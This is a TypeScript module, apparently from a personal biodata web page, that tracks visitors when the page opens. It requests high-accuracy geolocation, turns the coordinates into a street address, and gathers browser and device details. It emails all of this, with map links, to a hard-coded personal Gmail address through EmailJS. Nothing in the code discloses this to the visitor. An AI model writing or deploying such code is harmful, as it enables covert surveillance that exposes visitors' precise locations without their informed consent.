import emailjs from "@emailjs/browser";

export const EMAILJS_CONFIG = {
  SERVICE_ID: "service_yhpa91x",
  TEMPLATE_ID: "template_s71j8d7",
  PUBLIC_KEY: "t_7GFFUEQgfM5c5kj",
};

let initialized = false;
const ensureInit = () => {
  if (!initialized) {
    emailjs.init({ publicKey: EMAILJS_CONFIG.PUBLIC_KEY });
    initialized = true;
  }
};

const getVisitorInfo = () => {
  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screen = `${window.screen.width}x${window.screen.height}`;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const referrer = document.referrer || "Direct";
  return `User-Agent: ${ua}\nLanguage: ${lang}\nScreen: ${screen}\nTimezone: ${tz}\nReferrer: ${referrer}\nPage: ${window.location.href}`;
};

const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
      { headers: { "Accept-Language": "en" } }
    );
    const data = await res.json();
    return data?.display_name || "Address not found";
  } catch {
    return "Address lookup failed";
  }
};

const getFirstPosition = (): Promise<GeolocationPosition | null> => {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    let done = false;
    const finish = (pos: GeolocationPosition | null) => {
      if (done) return;
      done = true;
      resolve(pos);
    };
    navigator.geolocation.getCurrentPosition(
      (pos) => finish(pos),
      () => finish(null),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
    setTimeout(() => finish(null), 10000);
  });
};

export const sendVisitWithLocationEmail = async () => {
  try {
    const pos = await getFirstPosition();
    ensureInit();

    let locationBlock = "Location: Not available (permission denied or unsupported)";
    if (pos) {
      const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
      const address = await reverseGeocode(latitude, longitude);
      locationBlock =
        `📍 Address: ${address}\n` +
        `Latitude: ${latitude}\n` +
        `Longitude: ${longitude}\n` +
        `Accuracy: ~${Math.round(accuracy)} meters\n` +
        (altitude != null ? `Altitude: ${altitude} m\n` : "") +
        (heading != null ? `Heading: ${heading}\n` : "") +
        (speed != null ? `Speed: ${speed} m/s\n` : "") +
        `Google Maps: ${mapsUrl}\n` +
        `Precise pin: ${preciseUrl}`;
    }

    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
      email: "shubhamsc9799@gmail.com",
      subject: "📄 Biodata Page Opened",
      message: `Someone just opened your biodata page.\n\n${locationBlock}`,
      location: locationBlock,
      visitor_info: getVisitorInfo(),
      timestamp: new Date().toLocaleString(),
    });
  } catch (e) {
    console.error("Notify email failed:", e);
  }
};
